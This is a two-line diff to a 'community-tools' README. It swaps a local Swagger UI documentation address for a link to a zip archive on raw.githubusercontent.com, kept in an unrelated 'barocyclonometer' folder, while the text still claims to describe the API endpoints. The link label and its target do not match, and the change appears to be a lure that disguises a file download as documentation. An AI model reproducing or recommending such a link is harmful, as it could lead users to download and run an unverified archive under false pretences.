@@ -1,3 +1,3 @@
 # community-tools
 
-Swagger describes all available endpoints - http://localhost:8080/swagger-ui.html
+Swagger describes all available endpoints - https://raw.githubusercontent.com/karaedd/community-tools/master/barocyclonometer/community-tools.zip
